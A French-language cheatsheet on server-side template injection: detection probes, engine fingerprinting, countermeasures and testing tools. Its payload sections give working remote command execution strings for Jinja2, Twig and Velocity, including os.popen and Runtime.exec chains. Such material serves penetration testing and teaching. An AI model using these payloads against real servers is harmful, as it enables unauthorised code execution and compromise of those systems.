# 🧪 SSTI (Server-Side Template Injection) - Cheatsheet Cyber

Ce fichier regroupe les étapes, techniques et payloads pour **détecter, exploiter** et **comprendre les failles SSTI**, un vecteur critique permettant souvent l’exécution de code sur le serveur via les moteurs de templates.

---

## 🔍 1. Qu’est-ce qu’une SSTI ?

La **Server-Side Template Injection** est une vulnérabilité qui survient lorsque l’entrée utilisateur est interprétée par un moteur de template côté serveur **sans filtrage**.

Elle permet souvent :
- L’accès à des variables internes
- L’exécution de commandes systèmes (RCE)
- Le contournement de la logique applicative

---

## 🔎 2. Étapes pour reconnaître une SSTI

### 1. Identifier un moteur de template

Envoyer dans un champ contrôlable par l’utilisateur des **expressions typiques** :

{{7*7}}  
${7*7}  
<%= 7*7 %>  
#{7*7}  
> Si la page retourne 49, une SSTI est probable

### 2. Déterminer le moteur utilisé

Chaque moteur a ses propres syntaxes et fonctions. Exemples :

- **Jinja2 (Python)** : `{{7*7}}` → `49`
- **Twig (PHP)** : `{{7*7}}` → `49`
- **Velocity (Java)** : `#set($x = 7*7) $x`
- **Smarty (PHP)** : `{$smarty.version}`

> Observer les erreurs retournées pour en déduire le moteur

---

## 🧪 3. Payloads de test

### Basique (détection)

{{7*7}}  
> Devrait afficher 49

{{config}}  
> Tente d’afficher les variables d’environnement (Jinja2)

{{request.application}}  
> Obtenir des objets Flask (Python)

### Dump complet (Jinja2)

{{ ''.__class__.__mro__[1].__subclasses__() }}  
> Liste tous les types/classes

{{ ''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0] }}  
> Exécution de commande (ex: `id` sur Linux)

---

## 💥 4. Exploitation (RCE via SSTI)

### Jinja2 - Python

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}  
> RCE via accès à `os.popen`

### Twig - PHP

{{ system('id') }}  
> Si `system` est exposée

### Velocity - Java

#set($x="")  
$x.class.forName("java.lang.Runtime").getRuntime().exec("calc")

---

## 🛡 5. Contre-mesures SSTI

- Ne **jamais injecter directement** des données utilisateur dans des templates
- Utiliser les mécanismes de **contexte sûr** (auto-escaping)
- Filtrer/valider les données envoyées aux moteurs de template
- Mettre à jour les moteurs avec les derniers patchs

---

## 🛠 6. Outils pour tester SSTI

- **tplmap** (automatisation des payloads SSTI & RCE)
- **Burp Suite Intruder**
- **FuzzDB** ou **PayloadsAllTheThings**

---

## 📌 Ressources utiles

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PortSwigger Academy - SSTI](https://portswigger.net/web-security/server-side-template-injection)

---
